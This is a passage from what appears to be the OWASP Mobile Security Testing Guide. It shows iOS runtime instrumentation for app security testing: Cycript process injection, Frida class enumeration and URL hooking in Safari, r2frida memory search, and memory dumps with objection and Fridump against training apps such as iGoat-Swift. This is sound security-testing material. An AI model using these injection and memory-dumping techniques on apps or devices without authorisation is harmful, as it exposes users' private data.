interactive console, users can then manipulate the process with a hybrid
Objective-C++ and JavaScript syntax. Accessing and instantiating
Objective-C classes inside a running process is also possible.

In order to install Cycript, first download, unpack, and install the
SDK.

\begin{verbatim}
#on iphone
$ wget https://cydia.saurik.com/api/latest/3 -O cycript.zip && unzip cycript.zip
$ sudo cp -a Cycript.lib/*.dylib /usr/lib
$ sudo cp -a Cycript.lib/cycript-apl /usr/bin/cycript
\end{verbatim}

To spawn the interactive Cycript shell, run ``./cycript'' or ``cycript''
if Cycript is on your path.

\begin{verbatim}
$ cycript
cy#
\end{verbatim}

To inject into a running process, we first need to find the process ID
(PID). Run the application and make sure the app is in the foreground.
Running \texttt{cycript\ -p\ \textless{}PID\textgreater{}} injects
Cycript into the process. To illustrate, we will inject into SpringBoard
(which is always running).

\begin{verbatim}
$ ps -ef | grep SpringBoard
501 78 1 0 0:00.00 ?? 0:10.57 /System/Library/CoreServices/SpringBoard.app/SpringBoard
$ ./cycript -p 78
cy#
\end{verbatim}

One of the first things you can try out is to get the application
instance (\texttt{UIApplication}), you can use Objective-C syntax:

\begin{verbatim}
cy# [UIApplication sharedApplication]
cy# var a = [UIApplication sharedApplication]
\end{verbatim}

Use that variable now to get the application's delegate class:

\begin{verbatim}
cy# a.delegate
\end{verbatim}

Let's try to trigger an alert message on SpringBoard with Cycript.

\begin{verbatim}
cy# alertView = [[UIAlertView alloc] initWithTitle:@"OWASP MSTG" message:@"Mobile Security Testing Guide"  delegate:nil cancelButtonitle:@"OK" otherButtonTitles:nil]
#"<UIAlertView: 0x1645c550; frame = (0 0; 0 0); layer = <CALayer: 0x164df160>>"
cy# [alertView show]
cy# [alertView release]
\end{verbatim}

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/f891e21426c16da3312771ade698d40bf018f411.png}
\caption{Cycript Alert Sample}
\end{figure}

Find the app's document directory with Cycript:

\begin{verbatim}
cy# [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0]
#"file:///var/mobile/Containers/Data/Application/A8AE15EE-DC8B-4F1C-91A5-1FED35212DF/Documents/"
\end{verbatim}

The command
\texttt{{[}{[}UIApp\ keyWindow{]}\ recursiveDescription{]}.toString()}
returns the view hierarchy of \texttt{keyWindow}. The description of
every subview and sub-subview of \texttt{keyWindow} is shown. The
indentation space reflects the relationships between views. For example,
\texttt{UILabel}, \texttt{UITextField}, and \texttt{UIButton} are
subviews of \texttt{UIView}.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{cy\# [[UIApp keyWindow] recursiveDescription].toString()}
\NormalTok{\textasciigrave{}}\KeywordTok{<UIWindow:} \ErrorTok{0x16e82190;}\OtherTok{ frame} \OtherTok{=} \ErrorTok{(0} \ErrorTok{0;} \ErrorTok{320} \ErrorTok{568);} \ErrorTok{gestureRecognizers} \ErrorTok{=} \ErrorTok{<NSArray:} \ErrorTok{0x16e80ac0>;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<UIWindowLayer:} \ErrorTok{0x16e63ce0>>}
  \ErrorTok{|} \ErrorTok{<UIView:} \ErrorTok{0x16e935f0;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(0} \ErrorTok{0;} \ErrorTok{320} \ErrorTok{568);} \ErrorTok{autoresize} \ErrorTok{=} \ErrorTok{W+H;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<CALayer:} \ErrorTok{0x16e93680>>}
  \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<UILabel:} \ErrorTok{0x16e8f840;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(0} \ErrorTok{40;} \ErrorTok{82} \ErrorTok{20.5);} \ErrorTok{text} \ErrorTok{=} \StringTok{\textquotesingle{}i am groot!\textquotesingle{}}\ErrorTok{;}\OtherTok{ hidden} \OtherTok{=} \ErrorTok{YES;} \ErrorTok{opaque} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{autoresize} \ErrorTok{=} \ErrorTok{RM+BM;} \ErrorTok{userInteractionEnabled} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<\_UILabelLayer:} \ErrorTok{0x16e8f920>>}
  \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<UILabel:} \ErrorTok{0x16e8e030;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(0} \ErrorTok{110.5;} \ErrorTok{320} \ErrorTok{20.5);} \ErrorTok{text} \ErrorTok{=} \StringTok{\textquotesingle{}A Secret Is Found In The ...\textquotesingle{}}\ErrorTok{;}\OtherTok{ opaque} \OtherTok{=} \ErrorTok{NO;} \ErrorTok{autoresize} \ErrorTok{=} \ErrorTok{RM+BM;} \ErrorTok{userInteractionEnabled} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<\_UILabelLayer:} \ErrorTok{0x16e8e290>>}
  \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<UITextField:} \ErrorTok{0x16e8fbd0;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(8} \ErrorTok{141;} \ErrorTok{304} \ErrorTok{30);} \ErrorTok{text} \ErrorTok{=} \StringTok{\textquotesingle{}\textquotesingle{}}\ErrorTok{;}\OtherTok{ clipsToBounds} \OtherTok{=} \ErrorTok{YES;} \ErrorTok{opaque} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{autoresize} \ErrorTok{=} \ErrorTok{RM+BM;} \ErrorTok{gestureRecognizers} \ErrorTok{=} \ErrorTok{<NSArray:} \ErrorTok{0x16e94550>;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<CALayer:} \ErrorTok{0x16e8fea0>>}
  \ErrorTok{|}    \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<\_UITextFieldRoundedRectBackgroundViewNeue:} \ErrorTok{0x16e92770;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(0} \ErrorTok{0;} \ErrorTok{304} \ErrorTok{30);} \ErrorTok{opaque} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{autoresize} \ErrorTok{=} \ErrorTok{W+H;} \ErrorTok{userInteractionEnabled} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<CALayer:} \ErrorTok{0x16e92990>>}
  \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<UIButton:} \ErrorTok{0x16d901e0;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(8} \ErrorTok{191;} \ErrorTok{304} \ErrorTok{30);} \ErrorTok{opaque} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{autoresize} \ErrorTok{=} \ErrorTok{RM+BM;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<CALayer:} \ErrorTok{0x16d90490>>}
  \ErrorTok{|}    \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<UIButtonLabel:} \ErrorTok{0x16e72b70;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(133} \ErrorTok{6;} \ErrorTok{38} \ErrorTok{18);} \ErrorTok{text} \ErrorTok{=} \StringTok{\textquotesingle{}Verify\textquotesingle{}}\ErrorTok{;}\OtherTok{ opaque} \OtherTok{=} \ErrorTok{NO;} \ErrorTok{userInteractionEnabled} \ErrorTok{=} \ErrorTok{NO;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<\_UILabelLayer:} \ErrorTok{0x16e974b0>>}
  \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<\_UILayoutGuide:} \ErrorTok{0x16d92a00;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(0} \ErrorTok{0;} \ErrorTok{0} \ErrorTok{20);} \ErrorTok{hidden} \ErrorTok{=} \ErrorTok{YES;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<CALayer:} \ErrorTok{0x16e936b0>>}
  \ErrorTok{|}    \ErrorTok{|} \ErrorTok{<\_UILayoutGuide:} \ErrorTok{0x16d92c10;} \ErrorTok{frame} \ErrorTok{=} \ErrorTok{(0} \ErrorTok{568;} \ErrorTok{0} \ErrorTok{0);} \ErrorTok{hidden} \ErrorTok{=} \ErrorTok{YES;} \ErrorTok{layer} \ErrorTok{=} \ErrorTok{<CALayer:} \ErrorTok{0x16d92cb0>>\textasciigrave{}}
\end{Highlighting}
\end{Shaded}

You can also use Cycript's built-in functions such as \texttt{choose}
which searches the heap for instances of the given Objective-C class:

\begin{verbatim}
cy# choose(SBIconModel)
[#"<SBIconModel: 0x1590c8430>"]
\end{verbatim}

Learn more in the \href{http://www.cycript.org/manual/}{Cycript Manual}.

\hypertarget{information-gathering-3}{%
\subparagraph{Information Gathering}\label{information-gathering-3}}

In this section we will learn how to use Frida to obtain information
about a running application.

\hypertarget{getting-loaded-classes-and-their-methods-1}{%
\subparagraph{Getting Loaded Classes and their
Methods}\label{getting-loaded-classes-and-their-methods-1}}

In the Frida REPL Objective-C runtime the \texttt{ObjC} command can be
used to access information within the running app. Within the
\texttt{ObjC} command the function \texttt{enumerateLoadedClasses} lists
the loaded classes for a given application.

\begin{verbatim}
$ frida -U -f com.iOweApp

[iPhone::com.iOweApp]-> ObjC.enumerateLoadedClasses()
{
    "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation": [
        "__NSBlockVariable__",
        "__NSGlobalBlock__",
        "__NSFinalizingBlock__",
        "__NSAutoBlock__",
        "__NSMallocBlock__",
        "__NSStackBlock__"
    ],
    "/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp": [
        "JailbreakDetection",
        "CriticalLogic",
        "ViewController",
        "AppDelegate"
    ]
}
\end{verbatim}

Using
\texttt{ObjC.classes.\textless{}classname\textgreater{}.\$ownMethods}
the methods declared in each class can be listed.

\begin{verbatim}
[iPhone::com.iOweApp]-> ObjC.classes.JailbreakDetection.$ownMethods
[
    "+ isJailbroken"
]

[iPhone::com.iOweApp]-> ObjC.classes.CriticalLogic.$ownMethods
[
    "+ doSha256:",
    "- a:",
    "- AES128Operation:data:key:iv:",
    "- coreLogic",
    "- bat",
    "- b:",
    "- hexString:"
]
\end{verbatim}

\hypertarget{getting-loaded-libraries-1}{%
\subparagraph{Getting Loaded
Libraries}\label{getting-loaded-libraries-1}}

In Frida REPL process related information can be obtained using the
\texttt{Process} command. Within the \texttt{Process} command the
function \texttt{enumerateModules} lists the libraries loaded into the
process memory.

\begin{verbatim}
[iPhone::com.iOweApp]-> Process.enumerateModules()
[
    {
        "base": "0x10008c000",
        "name": "iOweApp",
        "path": "/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp",
        "size": 49152
    },
    {
        "base": "0x1a1c82000",
        "name": "Foundation",
        "path": "/System/Library/Frameworks/Foundation.framework/Foundation",
        "size": 2859008
    },
    {
        "base": "0x1a16f4000",
        "name": "libobjc.A.dylib",
        "path": "/usr/lib/libobjc.A.dylib",
        "size": 200704
    },

    ...
\end{verbatim}

Similarly, information related to various threads can be obtained.

\begin{verbatim}
Process.enumerateThreads()
[
    {
        "context": {
            ...
       },
        "id": 1287,
        "state": "waiting"
    },

    ...
\end{verbatim}

The \texttt{Process} command exposes multiple functions which can be
explored as per needs. Some useful functions are
\texttt{findModuleByAddress}, \texttt{findModuleByName} and
\texttt{enumerateRanges} besides others.

\hypertarget{method-hooking-1}{%
\subparagraph{Method Hooking}\label{method-hooking-1}}

Frida

In section \protect\hyperlink{execution-tracing}{``Execution Tracing''}
we've used frida-trace when navigating to a website in Safari and found
that the \texttt{initWithURL:} method is called to initialize a new URL
request object. We can look up the declaration of this method on the
\href{https://developer.apple.com/documentation/foundation/nsbundle/1409352-initwithurl?language=objc}{Apple
Developer Website}:

\begin{verbatim}
- (instancetype)initWithURL:(NSURL *)url;
\end{verbatim}

Using this information we can write a Frida script that intercepts the
\texttt{initWithURL:} method and prints the URL passed to the method.
The full script is below. Make sure you read the code and inline
comments to understand what's going on.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sys}
\ImportTok{import}\NormalTok{ frida}


\CommentTok{\# JavaScript to be injected}
\NormalTok{frida\_code }\OperatorTok{=} \StringTok{"""}

\StringTok{    // Obtain a reference to the initWithURL: method of the NSURLRequest class}
\StringTok{    var URL = ObjC.classes.NSURLRequest["{-} initWithURL:"];}

\StringTok{    // Intercept the method}
\StringTok{    Interceptor.attach(URL.implementation, \{}
\StringTok{        onEnter: function(args) \{}
\StringTok{            // Get a handle on NSString}
\StringTok{            var NSString = ObjC.classes.NSString;}

\StringTok{            // Obtain a reference to the NSLog function, and use it to print the URL value}
\StringTok{            // args[2] refers to the first method argument (NSURL *url)}
\StringTok{            var NSLog = new NativeFunction(Module.findExportByName(\textquotesingle{}Foundation\textquotesingle{}, \textquotesingle{}NSLog\textquotesingle{}), \textquotesingle{}void\textquotesingle{}, [\textquotesingle{}pointer\textquotesingle{}, \textquotesingle{}...\textquotesingle{}]);}

\StringTok{            // We should always initialize an autorelease pool before interacting with Objective{-}C APIs}
\StringTok{            var pool = ObjC.classes.NSAutoreleasePool.alloc().init();}

\StringTok{            try \{}
\StringTok{                // Creates a JS binding given a NativePointer.}
\StringTok{                var myNSURL = new ObjC.Object(args[2]);}

\StringTok{                // Create an immutable ObjC string object from a JS string object.}
\StringTok{                var str\_url = NSString.stringWithString\_(myNSURL.toString());}

\StringTok{                // Call the iOS NSLog function to print the URL to the iOS device logs}
\StringTok{                NSLog(str\_url);}

\StringTok{                // Use Frida\textquotesingle{}s console.log to print the URL to your terminal}
\StringTok{                console.log(str\_url);}

\StringTok{            \} finally \{}
\StringTok{                pool.release();}
\StringTok{            \}}
\StringTok{        \}}
\StringTok{    \});}
\StringTok{"""}

\NormalTok{process }\OperatorTok{=}\NormalTok{ frida.get\_usb\_device().attach(}\StringTok{"Safari"}\NormalTok{)}
\NormalTok{script }\OperatorTok{=}\NormalTok{ process.create\_script(frida\_code)}
\NormalTok{script.load()}

\NormalTok{sys.stdin.read()}
\end{Highlighting}
\end{Shaded}

Start Safari on the iOS device. Run the above Python script on your
connected host and open the device log (as explained in the section
``Monitoring System Logs'' from the chapter ``iOS Basic Security
Testing''). Try opening a new URL in Safari,
e.g.~\url{https://github.com/OWASP/owasp-mstg}; you should see Frida's
output in the logs as well as in your terminal.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/6a60765ca34ee9e713a1c08bd8506a2ef18541bf.png}
\caption{Frida Xcode Log}
\end{figure}

Of course, this example illustrates only one of the things you can do
with Frida. To unlock the tool's full potential, you should learn to use
its \href{https://www.frida.re/docs/javascript-api/}{JavaScript API}.
The documentation section of the Frida website has a
\href{https://www.frida.re/docs/ios/}{tutorial} and
\href{https://www.frida.re/docs/examples/ios/}{examples} for using Frida
on iOS.

\hypertarget{process-exploration-1}{%
\subparagraph{Process Exploration}\label{process-exploration-1}}

When testing an app, process exploration can provide the tester with
deep insights into the app process memory. It can be achieved via
runtime instrumentation and allows to perform tasks such as:

\begin{itemize}
\tightlist
\item
  Retrieving the memory map and loaded libraries.
\item
  Searching for occurrences of certain data.
\item
  After doing a search, obtaining the location of a certain offset in
  the memory map.
\item
  Performing a memory dump and inspect or reverse engineer the binary
  data \emph{offline}.
\item
  Reverse engineering a binary or Framework while it's running.
\end{itemize}

As you can see, these tasks are rather supportive and/or passive,
they'll help us collect data and information that will support other
techniques. Therefore, they're normally used in combination with other
techniques such as method hooking.

In the following sections you will be using r2frida to retrieve
information straight from the app runtime. First start by opening an
r2frida session to the target app (e.g.~iGoat-Swift) that should be
running on your iPhone (connected per USB). Use the following command:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{r2}\NormalTok{ frida://usb//iGoat{-}Swift}
\end{Highlighting}
\end{Shaded}

\begin{quote}
See all options with \texttt{r2\ frida://?}.
\end{quote}

Once in the r2frida session, all commands start with
\texttt{\textbackslash{}}. For example, in radare2 you'd run \texttt{i}
to display the binary information, but in r2frida you'd use
\texttt{\textbackslash{}i}.

Memory Maps and Inspection

You can retrieve the app's memory maps by running
\texttt{\textbackslash{}dm}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}dm}
\ExtensionTok{0x0000000100b7c000}\NormalTok{ {-} 0x0000000100de0000 r{-}x /private/var/containers/Bundle/Application/3ADAF47D{-}A734{-}49FA{-}B274{-}FBCA66589E67/iGoat{-}Swift.app/iGoat{-}Swift}
\ExtensionTok{0x0000000100de0000}\NormalTok{ {-} 0x0000000100e68000 rw{-} /private/var/containers/Bundle/Application/3ADAF47D{-}A734{-}49FA{-}B274{-}FBCA66589E67/iGoat{-}Swift.app/iGoat{-}Swift}
\ExtensionTok{0x0000000100e68000}\NormalTok{ {-} 0x0000000100e97000 r{-}{-} /private/var/containers/Bundle/Application/3ADAF47D{-}A734{-}49FA{-}B274{-}FBCA66589E67/iGoat{-}Swift.app/iGoat{-}Swift}
\ExtensionTok{...}
\ExtensionTok{0x0000000100ea8000}\NormalTok{ {-} 0x0000000100eb0000 rw{-}}
\ExtensionTok{0x0000000100eb0000}\NormalTok{ {-} 0x0000000100eb4000 r{-}{-}}
\ExtensionTok{0x0000000100eb4000}\NormalTok{ {-} 0x0000000100eb8000 r{-}x /usr/lib/TweakInject.dylib}
\ExtensionTok{0x0000000100eb8000}\NormalTok{ {-} 0x0000000100ebc000 rw{-} /usr/lib/TweakInject.dylib}
\ExtensionTok{0x0000000100ebc000}\NormalTok{ {-} 0x0000000100ec0000 r{-}{-} /usr/lib/TweakInject.dylib}
\ExtensionTok{0x0000000100f60000}\NormalTok{ {-} 0x00000001012dc000 r{-}x /private/var/containers/Bundle/Application/3ADAF47D{-}A734{-}49FA{-}B274{-}FBCA66589E67/iGoat{-}Swift.app/Frameworks/Realm.framework/Realm}
\end{Highlighting}
\end{Shaded}

While you're searching or exploring the app memory, you can always
verify where your current offset is located in the memory map. Instead
of noting and searching for the memory address in this list you can
simply run \texttt{\textbackslash{}dm.}. You'll find an example in the
following section ``In-Memory Search''.

If you're only interested into the modules (binaries and libraries) that
the app has loaded, you can use the command \texttt{\textbackslash{}il}
to list them all:

\begin{verbatim}
[0x00000000]> \il
0x0000000100b7c000 iGoat-Swift
0x0000000100eb4000 TweakInject.dylib
0x00000001862c0000 SystemConfiguration
0x00000001847c0000 libc++.1.dylib
0x0000000185ed9000 Foundation
0x000000018483c000 libobjc.A.dylib
0x00000001847be000 libSystem.B.dylib
0x0000000185b77000 CFNetwork
0x0000000187d64000 CoreData
0x00000001854b4000 CoreFoundation
0x00000001861d3000 Security
0x000000018ea1d000 UIKit
0x0000000100f60000 Realm
\end{verbatim}

As you might expect you can correlate the addresses of the libraries
with the memory maps: e.g.~the main app binary iGoat-Swift is located at
\texttt{0x0000000100b7c000} and the Realm Framework at
\texttt{0x0000000100f60000}.

You can also use objection to display the same information.

\begin{verbatim}
$ objection --gadget OWASP.iGoat-Swift explore

OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # memory list modules
Save the output by adding `--json modules.json` to this command

Name                              Base         Size                  Path
--------------------------------  -----------  --------------------  ------------------------------------------------------------------------------
iGoat-Swift                       0x100b7c000  2506752 (2.4 MiB)     /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGo...
TweakInject.dylib                 0x100eb4000  16384 (16.0 KiB)      /usr/lib/TweakInject.dylib
SystemConfiguration               0x1862c0000  446464 (436.0 KiB)    /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguratio...
libc++.1.dylib                    0x1847c0000  368640 (360.0 KiB)    /usr/lib/libc++.1.dylib
\end{verbatim}

In-Memory Search

In-memory search is a very useful technique to test for sensitive data
that might be present in the app memory.

See r2frida's help on the search command (\texttt{\textbackslash{}/?})
to learn about the search command and get a list of options. The
following shows only a subset of them:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}/?}
 \ExtensionTok{/}\NormalTok{      search}
 \ExtensionTok{/j}\NormalTok{     search json}
 \ExtensionTok{/w}\NormalTok{     search wide}
 \ExtensionTok{/wj}\NormalTok{    search wide json}
 \ExtensionTok{/x}\NormalTok{     search hex}
 \ExtensionTok{/xj}\NormalTok{    search hex json}
\ExtensionTok{...}
\end{Highlighting}
\end{Shaded}

You can adjust your search by using the search settings
\texttt{\textbackslash{}e\textasciitilde{}search}. For example,
\texttt{\textbackslash{}e\ search.quiet=true;} will print only the
results and hide search progress:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}e\textasciitilde{}search}
\ExtensionTok{e}\NormalTok{ search.in=perm:r{-}{-}}
\ExtensionTok{e}\NormalTok{ search.quiet=false}
\end{Highlighting}
\end{Shaded}

For now, we'll continue with the defaults and concentrate on string
search. In this first example, you can start by searching for something
that you know it should be located in the main binary of the app:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}/ iGoat}
\ExtensionTok{Searching}\NormalTok{ 5 bytes: 69 47 6f 61 74}
\ExtensionTok{Searching}\NormalTok{ 5 bytes in [0x0000000100b7c000{-}0x0000000100de0000]}
\ExtensionTok{...}
\ExtensionTok{hits}\NormalTok{: 509}
\ExtensionTok{0x100d7d332}\NormalTok{ hit2\_0 iGoat\_Swift24StringAnalysisExerciseVCC}
\ExtensionTok{0x100d7d3b2}\NormalTok{ hit2\_1 iGoat\_Swift28BrokenCryptographyExerciseVCC}
\ExtensionTok{0x100d7d442}\NormalTok{ hit2\_2 iGoat\_Swift23BackgroundingExerciseVCC}
\ExtensionTok{0x100d7d4b2}\NormalTok{ hit2\_3 iGoat\_Swift9AboutCellC}
\ExtensionTok{0x100d7d522}\NormalTok{ hit2\_4 iGoat\_Swift12FadeAnimatorV}
\end{Highlighting}
\end{Shaded}

Now take the first hit, seek to it and check your current location in
the memory map:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ s 0x100d7d332}
\NormalTok{[}\ExtensionTok{0x100d7d332}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}dm.}
\ExtensionTok{0x0000000100b7c000}\NormalTok{ {-} 0x0000000100de0000 r{-}x /private/var/containers/Bundle/Application/3ADAF47D{-}A734{-}49FA{-}B274{-}FBCA66589E67/iGoat{-}Swift.app/iGoat{-}Swift}
\end{Highlighting}
\end{Shaded}

As expected, you are located in the region of the main iGoat-Swift
binary (r-x, read and execute). In the previous section, you saw that
the main binary is located between \texttt{0x0000000100b7c000} and
\texttt{0x0000000100e97000}.

Now, for this second example, you can search for something that's not in
the app binary nor in any loaded library, typically user input. Open the
iGoat-Swift app and navigate in the menu to \textbf{Authentication}
-\textgreater{} \textbf{Remote Authentication} -\textgreater{}
\textbf{Start}. There you'll find a password field that you can
overwrite. Write the string ``owasp-mstg'' but do not click on
\textbf{Login} just yet. Perform the following two steps.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}/ owasp{-}mstg}
\ExtensionTok{hits}\NormalTok{: 1}
\ExtensionTok{0x1c06619c0}\NormalTok{ hit3\_0 owasp{-}mstg}
\end{Highlighting}
\end{Shaded}

In fact, the string could be found at address \texttt{0x1c06619c0}. Seek
\texttt{s} to there and retrieve the current memory region with
\texttt{\textbackslash{}dm.}.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x100d7d332}\NormalTok{]}\OperatorTok{>}\NormalTok{ s 0x1c06619c0}
\NormalTok{[}\ExtensionTok{0x1c06619c0}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}dm.}
\ExtensionTok{0x00000001c0000000}\NormalTok{ {-} 0x00000001c8000000 rw{-}}
\end{Highlighting}
\end{Shaded}

Now you know that the string is located in a rw- (read and write) region
of the memory map.

Additionally, you can search for occurrences of the
\href{https://en.wikipedia.org/wiki/Wide_character}{wide version of the
string} (\texttt{\textbackslash{}/w}) and, again, check their memory
regions:

\begin{quote}
This time we run the \texttt{\textbackslash{}dm.} command for all
\texttt{@@} hits matching the glob \texttt{hit5\_*}.
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}/w owasp{-}mstg}
\ExtensionTok{Searching}\NormalTok{ 20 bytes: 6f 00 77 00 61 00 73 00 70 00 2d 00 6d 00 73 00 74 00 67 00}
\ExtensionTok{Searching}\NormalTok{ 20 bytes in [0x0000000100708000{-}0x000000010096c000]}
\ExtensionTok{...}
\ExtensionTok{hits}\NormalTok{: 2}
\ExtensionTok{0x1020d1280}\NormalTok{ hit5\_0 6f0077006100730070002d006d00730074006700}
\ExtensionTok{0x1030c9c85}\NormalTok{ hit5\_1 6f0077006100730070002d006d00730074006700}

\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}dm.@@ hit5\_*}
\ExtensionTok{0x0000000102000000}\NormalTok{ {-} 0x0000000102100000 rw{-}}
\ExtensionTok{0x0000000103084000}\NormalTok{ {-} 0x00000001030cc000 rw{-}}
\end{Highlighting}
\end{Shaded}

They are in a different rw- region. Note that searching for the wide
versions of strings is sometimes the only way to find them as you'll see
in the following section.

In-memory search can be very useful to quickly know if certain data is
located in the main app binary, inside a shared library or in another
region. You may also use it to test the behavior of the app regarding
how the data is kept in memory. For instance, you could continue the
previous example, this time clicking on Login and searching again for
occurrences of the data. Also, you may check if you still can find those
strings in memory after the login is completed to verify if this
\emph{sensitive data} is wiped from memory after its use.

Memory Dump

You can dump the app's process memory with
\href{https://github.com/sensepost/objection}{objection} and
\href{https://github.com/Nightbringer21/fridump}{Fridump}. To take
advantage of these tools on a non-jailbroken device, the Android app
must be repackaged with \texttt{frida-gadget.so} and re-signed. A
detailed explanation of this process is in the section
"\protect\hyperlink{dynamic-analysis-on-non-jailbroken-devices}{Dynamic
Analysis on Non-Jailbroken Devices}. To use these tools on a jailbroken
phone, simply have frida-server installed and running.

With objection it is possible to dump all memory of the running process
on the device by using the command \texttt{memory\ dump\ all}.

\begin{verbatim}
$ objection explore

iPhone on (iPhone: 10.3.1) [usb] # memory dump all /Users/foo/memory_iOS/memory
Dumping 768.0 KiB from base: 0x1ad200000  [####################################]  100%
Memory dumped to file: /Users/foo/memory_iOS/memory
\end{verbatim}

Alternatively you can use Fridump. First, you need the name of the app
you want to dump, which you can get with \texttt{frida-ps}.

\begin{verbatim}
$ frida-ps -U
 PID  Name
----  ------
1026  Gadget
\end{verbatim}

Afterwards, specify the app name in Fridump.

\begin{verbatim}
$ python3 fridump.py -u Gadget -s

Current Directory: /Users/foo/PentestTools/iOS/fridump
Output directory is set to: /Users/foo/PentestTools/iOS/fridump/dump
Creating directory...
Starting Memory dump...
Progress: [##################################################] 100.0% Complete

Running strings on all files:
Progress: [##################################################] 100.0% Complete

Finished! Press Ctrl+C
\end{verbatim}

When you add the \texttt{-s} flag, all strings are extracted from the
dumped raw memory files and added to the file \texttt{strings.txt},
which is stored in Fridump's dump directory.

In both cases, if you open the file in radare2 you can use its search
command (\texttt{/}). Note that first we do a standard string search
which doesn't succeed and next we search for a
\href{https://en.wikipedia.org/wiki/Wide_character}{wide string}, which
successfully finds our string ``owasp-mstg''.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{r2}\NormalTok{ memory\_ios}
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ / owasp{-}mstg}
\ExtensionTok{Searching}\NormalTok{ 10 bytes in [0x0{-}0x628c000]}
\ExtensionTok{hits}\NormalTok{: 0}
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ /w owasp{-}mstg}
\ExtensionTok{Searching}\NormalTok{ 20 bytes in [0x0{-}0x628c000]}
\ExtensionTok{hits}\NormalTok{: 1}
\ExtensionTok{0x0036f800}\NormalTok{ hit4\_0 6f0077006100730070002d006d00730074006700}
\end{Highlighting}
\end{Shaded}

Next, we can seek to its address using \texttt{s\ 0x0036f800} or
\texttt{s\ hit4\_0} and print it using \texttt{psw} (which stands for
\emph{print string wide}) or use \texttt{px} to print its raw
hexadecimal values:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x0036f800}\NormalTok{]}\OperatorTok{>}\NormalTok{ psw}
\ExtensionTok{owasp{-}mstg}

\NormalTok{[}\ExtensionTok{0x0036f800}\NormalTok{]}\OperatorTok{>}\NormalTok{ px 48}
\ExtensionTok{{-}}\NormalTok{ offset {-}   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF}
\ExtensionTok{0x0036f800}\NormalTok{  6f00 7700 6100 7300 7000 2d00 6d00 7300  o.w.a.s.p.{-}.m.s.}
\ExtensionTok{0x0036f810}\NormalTok{  7400 6700 0000 0000 0000 0000 0000 0000  t.g.............}
\ExtensionTok{0x0036f820}\NormalTok{  0000 0000 0000 0000 0000 0000 0000 0000  ................}
\end{Highlighting}
\end{Shaded}

Note that in order to find this string using the \texttt{strings}
